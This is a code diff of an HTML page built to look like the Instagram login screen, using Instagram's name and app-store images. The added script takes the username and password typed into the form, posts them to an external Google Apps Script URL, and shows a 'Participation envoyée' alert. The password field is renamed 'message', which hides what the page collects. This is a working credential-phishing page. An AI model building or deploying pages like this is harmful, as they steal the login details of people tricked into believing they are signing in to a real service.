@@ -5,44 +5,74 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <title>login form</title>
 </head>
+
 <body>
   <div class="container">
     <p class="insta">instagram</p>
-    <label for="name" ><input type="text" id="name" placeholder="Phone number,username or email"></label>
-    
-    <label for="password" ><input type="password" id="password" name="password"></label>
-    
-    <button><a href="#">Log in<a></button>
-    
+
+    <label for="name">
+      <input type="text" id="name" placeholder="Phone number, username or email">
+    </label>
+
+    <label for="message">
+      <input type="password" id="message" placeholder="Password">
+    </label>
+
+    <button id="sendBtn">Log in</button>
+
     <div>OR</div>
-    
-    <div class="fb"><a href="#" class="fa fa-facebook"></a><a href="#">Log in with facebook<a/></div>
-    
-      <div><a href="#">Forgot password?</a></div>
-      
+
+    <div class="fb">
+      <a href="#" class="fa fa-facebook"></a>
+      <a href="#">Log in with Facebook</a>
     </div>
-    
-    <div class="signup">Don't have an account <a href="3">Sign up</a><div>
-      
-      </div>
-      
-      <p>Get the app</a>
-    
-      
-      <div class="appimg">
-        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="playstore" width="135px" height="45px">
-        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="microsoft" width="135px" height="45px">
-      </div>
-    
-    
-    
-    
-  
+
+    <div><a href="#">Forgot password?</a></div>
+  </div>
+
+  <div class="signup">
+    Don't have an account <a href="#">Sign up</a>
+  </div>
+
+  <p>Get the app</p>
+
+  <div class="appimg">
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="playstore" width="135px" height="45px">
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="microsoft" width="135px" height="45px">
+  </div>
+
+  <!-- SCRIPT GOOGLE SHEETS -->
+  <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbygX4UOUEjQY05j8CwNRWtmOFykS-cB0J2377XiNPBjNk9Wuf0eZ9vw8ZccPHY2fOPkEg/exec"; // <-- COLLE TON URL ICI
+
+    document.getElementById("sendBtn").addEventListener("click", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("name").value;
+      const message = document.getElementById("message").value;
+
+      const formData = new FormData();
+      formData.append("username", username);
+      formData.append("message", message);
+
+      fetch(SCRIPT_URL, {
+        method: "POST",
+        body: formData
+      })
+      .then(() => {
+        alert("Participation envoyée !");
+      })
+      .catch(() => {
+        alert("Erreur lors de l'envoi");
+      });
+    });
+  </script>
+
 </body>
 </html>
 <style>body{
@@ -123,25 +153,3 @@ a{
   text-decoration-line: none;
 }
 </style>
-
-<script>
-  const SCRIPT_URL = "COLLE_ICI_TON_URL_WEB_APP";
-
-  document.querySelector("button").addEventListener("click", function(e) {
-    e.preventDefault(); // empêche le rechargement de la page
-
-    const username = document.getElementById("name").value;
-    const message = document.getElementById("password").value; // renomme-le plus tard
-
-    const formData = new FormData();
-    formData.append("username", username);
-    formData.append("message", message);
-
-    fetch(SCRIPT_URL, {
-      method: "POST",
-      body: formData
-    })
-    .then(() => alert("Participation envoyée !"))
-    .catch(() => alert("Erreur lors de l'envoi"));
-  });
-</script>
